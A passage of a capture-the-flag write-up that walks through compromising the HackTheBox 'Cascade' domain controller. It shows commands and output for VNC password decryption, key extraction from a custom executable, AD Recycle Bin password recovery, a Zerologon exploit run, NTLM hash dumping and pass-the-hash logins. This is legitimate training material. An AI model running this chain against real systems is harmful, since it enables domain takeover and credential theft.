└─$ echo '6bcf2a4b6e5aca0f' | xxd -r -p | openssl enc -des-cbc --nopad --nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d -provider legacy -provider default | hexdump -Cv
00000000  73 54 33 33 33 76 65 32                           |sT333ve2|
00000008
```
By googling how to decrypt VNC passwords from the `.reg` format we stumble upon this [oneliner](https://github.com/billchaison/VNCDecrypt). Which takes the raw hex string, passes it through `xxd` using `-r` for "revert" and `-p` for outputting to plain hexdump style. We then pass that value to `openssl` specifying the specific encoding, padding, and salt options required plus providing the cryptographic key that VNC uses to encrypt their hashes and the required initialization vector `-iv` for use with the key. Finally we tell it to decrypt with `-d` loading both the default and legacy crypto algorithm providers will allow us to decrypt the hexdump while still performing base openssl features on it. We then pass that to `hexdump` with `-Cv` to keep output canonical and to output identical looking lines. 

```zsh
┌──(kali㉿kali)-[~/CTF/HTB/cascade/loot]
└─$ nxc smb casc-dc1.cascade.local -u 's.smith' -p 'sT333ve2'                                       
SMB         10.129.139.119  445    CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.139.119  445    CASC-DC1         [+] cascade.local\s.smith:sT333ve2
```
As you can see we successfully decrypt the password for `s.smith` and authenticate to the server with his user.

### user.txt
```zsh
┌──(kali㉿kali)-[~/CTF/HTB/cascade/loot]
└─$ evil-winrm -i $IP -u 's.smith' -p 'sT333ve2'
                                        
Evil-WinRM shell v4.1
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
                                        
Info: Connection successful
*Evil-WinRM* PS C:\Users\s.smith\Documents> dir ../Desktop


    Directory: C:\Users\s.smith\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---       10/25/2026   7:52 PM             34 user.txt
-a----         2/4/2021   4:24 PM           1031 WinDirStat.lnk

```
And just as we thought, we find `user.txt` along with `WinDirStat.lnk` sitting on his Desktop.

## Privilege Escalation
### Authenticated Share Access (s.smith)
```zsh
┌──(kali㉿kali)-[~/CTF/HTB/cascade/loot]
└─$ nxc smb casc-dc1.cascade.local -u 's.smith' -p 'sT333ve2' --shares
SMB         10.129.139.119  445    CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.139.119  445    CASC-DC1         [+] cascade.local\s.smith:sT333ve2 
SMB         10.129.139.119  445    CASC-DC1         [*] Enumerated shares
SMB         10.129.139.119  445    CASC-DC1         Share           Permissions     Remark
SMB         10.129.139.119  445    CASC-DC1         -----           -----------     ------
SMB         10.129.139.119  445    CASC-DC1         ADMIN$                          Remote Admin
SMB         10.129.139.119  445    CASC-DC1         Audit$          READ            
SMB         10.129.139.119  445    CASC-DC1         C$                              Default share
SMB         10.129.139.119  445    CASC-DC1         Data            READ            
SMB         10.129.139.119  445    CASC-DC1         IPC$                            Remote IPC
SMB         10.129.139.119  445    CASC-DC1         NETLOGON        READ            Logon server share 
SMB         10.129.139.119  445    CASC-DC1         print$          READ            Printer Drivers
SMB         10.129.139.119  445    CASC-DC1         SYSVOL          READ            Logon server share 
```
Looking at Steve's access we see that he has read access to the `Audit$` share which appears to be non-standard as well.

#### Share Enumeration
```zsh
┌──(kali㉿kali)-[~/…/cascade/loot/s.smith/Audit]
└─$ ls
total 592K
4.0K drwxrwxr-x 5 kali kali 4.0K Oct 25 18:29 .
4.0K drwxrwxr-x 4 kali kali 4.0K Oct 25 18:29 ..
 16K -rw-r--r-- 1 kali kali  13K Oct 25 18:27 CascAudit.exe
 12K -rw-r--r-- 1 kali kali  12K Oct 25 18:27 CascCrypto.dll
4.0K drwxrwxr-x 2 kali kali 4.0K Oct 25 18:27 DB
4.0K -rw-r--r-- 1 kali kali   45 Oct 25 18:27 RunAudit.bat
356K -rw-r--r-- 1 kali kali 355K Oct 25 18:27 System.Data.SQLite.dll
184K -rw-r--r-- 1 kali kali 183K Oct 25 18:27 System.Data.SQLite.EF6.dll
4.0K drwxrwxr-x 2 kali kali 4.0K Oct 25 18:27 x64
4.0K drwxrwxr-x 2 kali kali 4.0K Oct 25 18:27 x86

```
We connect to the share over SMB and download everything we can. 

```zsh
┌──(kali㉿kali)-[~/…/cascade/loot/s.smith/Audit]
└─$ cat RunAudit.bat            
CascAudit.exe "\\CASC-DC1\Audit$\DB\Audit.db" 

┌──(kali㉿kali)-[~/…/loot/s.smith/Audit/DB]
└─$ file Audit.db                                                                                                                                     
Audit.db: SQLite 3.x database, last written using SQLite version 3027002, file counter 60, database pages 6, 1st free page 6, free pages 1, cookie 0x4b, schema 4, UTF-8, version-valid-for 60

```
Once inside we find a script called `RunAudit.bat` which calls a custom application called `CascAudit.exe` and exports that output to a database called `Audit.db`. Further enumeration of the database shows it's a `sqlite3` database. Let's see if we can read it locally.

### Database dump
```zsh
sqlite> .tables
DeletedUserAudit     Ldap     Misc
sqlite> .tables DeletedUserAudit
DeletedUserAudit
sqlite> .schema DeletedUserAudit
CREATE TABLE "DeletedUserAudit" (
	"Id"	INTEGER PRIMARY KEY AUTOINCREMENT,
	"Username"	TEXT,
	"Name"	TEXT,
	"DistinguishedName"	TEXT
);
sqlite> select * from DeletedUserAudit;
╭────┬───────────┬──────────────────────────────────────────┬──────────────────────────────────────────────────────────────────────────────────────────────────╮
│ Id │ Username  │                   Name                   │                                        DistinguishedName                                         │
╞════╪═══════════╪══════════════════════════════════════════╪══════════════════════════════════════════════════════════════════════════════════════════════════╡
│  6 │ test      │ Test                                     │ CN=Test\0ADEL:ab073fb7-6d91-4fd1-b877-817b9e1b0e6d,CN=Deleted Objects,DC=cascade,DC=local        │
│    │           │ DEL:ab073fb7-6d91-4fd1-b877-817b9e1b0e6d │                                                                                                  │
├────┼───────────┼──────────────────────────────────────────┼──────────────────────────────────────────────────────────────────────────────────────────────────┤
│  7 │ deleted   │ deleted guy                              │ CN=deleted guy\0ADEL:8cfe6d14-caba-4ec0-9d3e-28468d12deef,CN=Deleted Objects,DC=cascade,DC=local │
│    │           │ DEL:8cfe6d14-caba-4ec0-9d3e-28468d12deef │                                                                                                  │
├────┼───────────┼──────────────────────────────────────────┼──────────────────────────────────────────────────────────────────────────────────────────────────┤
│  9 │ TempAdmin │ TempAdmin                                │ CN=TempAdmin\0ADEL:5ea231a1-5bb4-4917-b07a-75a57f4c188a,CN=Deleted Objects,DC=cascade,DC=local   │
│    │           │ DEL:5ea231a1-5bb4-4917-b07a-75a57f4c188a │                                                                                                  │
╰────┴───────────┴──────────────────────────────────────────┴──────────────────────────────────────────────────────────────────────────────────────────────────╯
sqlite> .tables
DeletedUserAudit     Ldap     Misc
sqlite> .schema Ldap
CREATE TABLE "Ldap" (
	"Id"	INTEGER PRIMARY KEY AUTOINCREMENT,
	"uname"	TEXT,
	"pwd"	TEXT,
	"domain"	TEXT
);
sqlite> select * from Ldap;
╭────┬────────┬──────────────────────────┬───────────────╮
│ Id │ uname  │           pwd            │    domain     │
╞════╪════════╪══════════════════════════╪═══════════════╡
│  1 │ ArkSvc │ BQO5l5Kj9MdErXx6Q6AGOw== │ cascade.local │
╰────┴────────┴──────────────────────────┴───────────────╯
sqlite> select * from Misc;
sqlite>
```
We dump each table to find records of deleted users, including the `TempAdmin` user that was mentioned in the archive email. We additionally seem to get a base64 encoded password for the `arksvc` user. However when we decode it, it is an encrypted random string and not a plaintext password.

### Executable Enumeration
```zsh
┌──(kali㉿kali)-[~/…/cascade/loot/s.smith/Audit]
└─$ pestr CascAudit.exe                          
!This program cannot be run in DOS mode.
---SNIP---
CascAudiot.Resources
Invalid number of command line args specified. Must specify database path only
Data Source=
;Version=3;
SELECT * FROM LDAP
Uname
Domain
c4scadek3y654321
Error decrypting password: 
Error getting LDAP connection data From database: 
(&(isDeleted=TRUE)(objectclass=user))
sAMAccountName
distinguishedName
Found 
 results from LDAP query
INSERT INTO DeletedUserAudit (Name,Username,DistinguishedName) VALUES (@Name,@Username,@Dn)
@Name
@Username
Successfully inserted 
 row(s) into database
WrapNonExceptionThrows
CascDbConnect
Copyright
---SNIP---
```
We pass the custom executable `CascAudit.exe` through `pestr` which is a tool to search strings inside Windows Portable Executables (.exe). As you can see there seems to be a hardcoded decryption key contained within. Let's see if we can do anything with this key: `c4scadek3y654321`.

![Pasted image 20261025162039.png](/img/user/CTFs/HTB/Images/Cascade%20Images/Pasted%20image%2020261025162039.png)
Taking a look at our executable through DotPeek we do confirm that this custom executable is using the key we found to decrypt the password string inside the `LDAP` table of the sqlite db belonging to user `arksvc`.

![Pasted image 20261025162227.png](/img/user/CTFs/HTB/Images/Cascade%20Images/Pasted%20image%2020261025162227.png)
We also found in our executable references to the custom DLL included in the share called `CascCrypto.dll` as `CascAudit.exe` calls `Crypto.DecryptString()` to get the password. Checking out the source on that DLL reveals a hardcoded initialization vector for that encryption key. Now that we have the encrypted password, key and IV. It's time to put them all together to decrypt this thing. It's also important to note the full encryption specs we can find from the DLL. It's using AES, CBC mode, block and key size are 128 and it's UTF-8 encoded.

![Pasted image 20261025162954.png](/img/user/CTFs/HTB/Images/Cascade%20Images/Pasted%20image%2020261025162954.png)
We successfully decrypt the password for `arksvc`

### arksvc group membership enumeration
```zsh
*Evil-WinRM* PS C:\Users\arksvc\Documents> net user arksvc
User name                    arksvc
Full Name                    ArkSvc
Comment
User's comment
Country code                 000 (System Default)
Account active               Yes
Account expires              Never

Password last set            1/9/2020 4:18:20 PM
Password expires             Never
Password changeable          1/9/2020 4:18:20 PM
Password required            Yes
User may change password     No

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   1/29/2020 9:05:40 PM

Logon hours allowed          All

Local Group Memberships      *AD Recycle Bin       *IT
                             *Remote Management Use
Global Group memberships     *Domain Users
The command completed successfully.
```
We see that user `arksvc` is interestingly a member of "AD Recycle Bin" group. This means we can read out all the deleted active directory objects on the server.
### AD Recycle Bin
```zsh
nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity
ObjectCategory                  :
ObjectClass                     : container
ObjectGUID                      : 746385f2-e3a0-4252-b83a-5a206da0ed88
ProtectedFromAccidentalDeletion : False
sDRightsEffective               : 0
showInAdvancedViewOnly          : True
uSNChanged                      : 196700
uSNCreated                      : 196690
whenChanged                     : 1/26/2020 2:40:52 AM
whenCreated                     : 1/26/2020 2:34:31 AM

accountExpires                  : 9223372036854775807
badPasswordTime                 : 0
badPwdCount                     : 0
CanonicalName                   : cascade.local/Deleted Objects/TempAdmin
                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
cascadeLegacyPwd                : YmFDVDNyMWFOMDBkbGVz
CN                              : TempAdmin
                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
codePage                        : 0
countryCode                     : 0
Created                         : 1/27/2020 3:23:08 AM
createTimeStamp                 : 1/27/2020 3:23:08 AM
Deleted                         : True
Description                     :
DisplayName                     : TempAdmin
DistinguishedName               : CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local
dSCorePropagationData           : {1/27/2020 3:23:08 AM, 1/1/1601 12:00:00 AM}
givenName                       : TempAdmin
instanceType                    : 4
isDeleted                       : True
LastKnownParent                 : OU=Users,OU=UK,DC=cascade,DC=local
lastLogoff                      : 0
lastLogon                       : 0
logonCount                      : 0
Modified                        : 1/27/2020 3:24:34 AM
modifyTimeStamp                 : 1/27/2020 3:24:34 AM
msDS-LastKnownRDN               : TempAdmin
Name                            : TempAdmin
                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity
ObjectCategory                  :
ObjectClass                     : user
ObjectGUID                      : f0cc344d-31e0-4866-bceb-a842791ca059
objectSid                       : S-1-5-21-3332504370-1206983947-1165150453-1136
primaryGroupID                  : 513
ProtectedFromAccidentalDeletion : False
pwdLastSet                      : 132245689883479503
sAMAccountName                  : TempAdmin
sDRightsEffective               : 0
userAccountControl              : 66048
userPrincipalName               : TempAdmin@cascade.local
uSNChanged                      : 237705
uSNCreated                      : 237695
whenChanged                     : 1/27/2020 3:24:34 AM
whenCreated                     : 1/27/2020 3:23:08 AM

```
Using this oneliner from hacktricks we are able to successfully enumerate deleted objects in AD and see that the user `TempAdmin` also has a `cascadeLegacyPwd` value set. We remember from our note earlier that TempAdmin uses the same password they set for all admin accounts.
#### Decrypting TempAdmin's legacy password
```zsh
┌──(kali㉿kali)-[~/…/cascade/loot/s.smith/Audit]
└─$ echo 'YmFDVDNyMWFOMDBkbGVz' | base64 -d
baCT3r1aN00dles
```
We successfully decode the string to give us the plaintext password.

```zsh
┌──(kali㉿kali)-[~/…/cascade/loot/s.smith/Audit]
└─$ evil-winrm -i $IP -u 'administrator' -p 'baCT3r1aN00dles'                 
                                        
Evil-WinRM shell v4.1
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
                                        
Info: Connection successful
*Evil-WinRM* PS C:\Users\Administrator\Documents> dir ../Desktop


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---       10/25/2026   7:52 PM             34 root.txt
```
Just like the email said, we are able to successfully authenticate to the server as `administrator` reusing the legacy password we stole from TempAdmin. Pwned.

## Headshot Cheese Method
### Zerologon strikes again
```zsh
┌──(kali㉿kali)-[~/CTF/HTB/cascade/exploit]
└─$ nxc smb casc-dc1.cascade.local -u '' -p '' -M zerologon
SMB         10.129.139.119  445    CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.139.119  445    CASC-DC1         [+] cascade.local\: 
ZEROLOGON   10.129.139.119  445    CASC-DC1         VULNERABLE
ZEROLOGON   10.129.139.119  445    CASC-DC1         Next step: https://github.com/dirkjanm/CVE-2020-1472

┌──(kali㉿kali)-[~/CTF/HTB/cascade/exploit]
└─$ python3 cve-2020-1472-exploit.py CASC-DC1 $IP
Performing authentication attempts...
=====================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================
Target vulnerable, changing account password to empty string

Result: 0

Exploit complete!

```
One of our base checks we always look for with Null access is the [zerologon](https://github.com/dirkjanm/CVE-2020-1472) vulnerability. This exploits a cryptographic flaw in Microsoft's Active Directory Netlogon Remote Protocol (MS-NRPC). It allows us to logon to servers that are using NTLM which a DC would be. Affected versions do include Windows Server 2008 R2 SP1 which ours is. The script says we successfully execute the attack, setting the machine's password to `null`. Let's see if we can dump secrets now.

#### Secrets Dump
```zsh
┌──(kali㉿kali)-[~/CTF/HTB/cascade/exploit]
└─$ impacket-secretsdump -just-dc -no-pass 'cascade.local/CASC-DC1$@10.129.139.119'
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
cascade.local\administrator:500:aad3b435b51404eeaad3b435b51404ee:7c2ea40b06d267f1557a09ac086b4487:::
cascade.local\CascGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:3a1b37192392d74e86d04242288dc147:::
cascade.local\arksvc:1106:aad3b435b51404eeaad3b435b51404ee:10ffc991edaa4635cf81eb91762420cb:::
cascade.local\s.smith:1107:aad3b435b51404eeaad3b435b51404ee:b48b49789458698abadc119c8e310703:::
cascade.local\r.thompson:1109:aad3b435b51404eeaad3b435b51404ee:63251f7b1bada5082e5ffb18261ba28f:::
cascade.local\util:1111:aad3b435b51404eeaad3b435b51404ee:49a914ea7201025aeff21cd858ec7d66:::
cascade.local\j.wakefield:1116:aad3b435b51404eeaad3b435b51404ee:13ae5d7704258917054d662d016eab60:::
cascade.local\s.hickson:1121:aad3b435b51404eeaad3b435b51404ee:2776416ceb426c515cab11bb8411067b:::
cascade.local\j.goodhand:1122:aad3b435b51404eeaad3b435b51404ee:1d6eb7e45708504e0a9646b7aea9fc9b:::
cascade.local\a.turnbull:1124:aad3b435b51404eeaad3b435b51404ee:1d6eb7e45708504e0a9646b7aea9fc9b:::
cascade.local\e.crowe:1127:aad3b435b51404eeaad3b435b51404ee:95d4f729c16ae37b910317d665ba2215:::
cascade.local\b.hanson:1128:aad3b435b51404eeaad3b435b51404ee:5da61ebae419b915627f25f101fe6b1b:::
cascade.local\d.burman:1129:aad3b435b51404eeaad3b435b51404ee:5da61ebae419b915627f25f101fe6b1b:::
cascade.local\BackupSvc:1130:aad3b435b51404eeaad3b435b51404ee:c27e154566c4788326fce339f4b55491:::
cascade.local\j.allen:1134:aad3b435b51404eeaad3b435b51404ee:64928a685f9a995045f8c04bbf86881d:::
cascade.local\i.croft:1135:aad3b435b51404eeaad3b435b51404ee:431682a8242a237e805badacab95b0e4:::
CASC-DC1$:1001:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```
We use `impacket-secretsdump` passing `-just-dc` and `-no-pass` to ensure it only grabs only the NTLM and Kerberos hashes (not pictured) on the system, and since our script sets the password to `null` we use the no pass flag to skip authentication. As you can see we successfully dump every user's NTLM hash that was stored on the server including the `administrator` user's. PWNED

```zsh
┌──(kali㉿kali)-[~/CTF/HTB/cascade/exploit]
└─$ evil-winrm -i $IP -u 'administrator' -H '7c2ea40b06d267f1557a09ac086b4487'
                                        
Evil-WinRM shell v4.1
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
                                        
Info: Connection successful
*Evil-WinRM* PS C:\Users\Administrator\Documents> dir ../Desktop


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---       10/25/2026   7:52 PM             34 root.txt
```
We can immediately get a shell via pass-the-hash as the Administrator and find `root.txt` sitting on their desktop.


## Final Thoughts
>[!Takeaways]
>- Always check for zerologon
>- When ever you come across a VNC `.reg` registry, there is a commonly known exploit to decrypt password strings inside it.
>- Use dotpeek to dissassemble EXEs and DLLs. it saves a lot of headache
>- You can use cyberchef to decrypt stuff
>- AD Recycle Bin users have permission to read all deleted objects in AD. Look at hacktricks on the syntax.
>- I hate reversing/code audits.



